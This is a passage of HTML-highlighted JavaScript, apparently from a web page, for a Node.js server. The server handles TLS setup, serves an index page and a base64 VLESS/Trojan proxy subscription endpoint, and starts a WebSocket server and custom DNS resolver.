&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    console.warn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Failed to &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; TLS file &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedPath&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;: &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.message&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; getTLSOptions&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process.env.TLS_KEY&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process.env.TLS_CERT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!key&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLS_KEY_PATH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLS_CERT_PATH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;key &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; key, cert &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;key &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; cert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    console.warn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Both TLS key and certificate are required; falling back to HTTP.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; null&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;requestHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req, res&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req.url &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;filePath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; path.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__dirname, &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fs.readFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err, content&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;req.url &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;/&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SUB_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;namePart&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; NAME ? &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; : ISP&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;vlessURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;vless://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;@&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:443?encryption&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;none&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sni&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;chrome&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ws&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%2F&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#${namePart}`;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;trojanURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;trojan://&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;@&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;:443?security&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sni&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;chrome&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ws&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%2F&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#${namePart}`;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;subscription&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; vlessURL + &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; + trojanURL&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;base64Content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Buffer.from&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;subscription&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;200, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;base64Content + &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.writeHead&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;404, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    res.end&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Not Found\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;tlsOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; getTLSOptions&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;httpServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; tlsOptions ? https.createServer&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tlsOptions, requestHandler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : http.createServer&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;requestHandler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;wss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; new WebSocket.Server&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; server: httpServer &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;uuid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; UUID.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/-/g, &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;DNS_SERVERS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;114.114.114.114&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;223.5.5.5&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Custom DNS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;async &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; String&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.trim&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!target&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; throw new Error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Host is empty&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
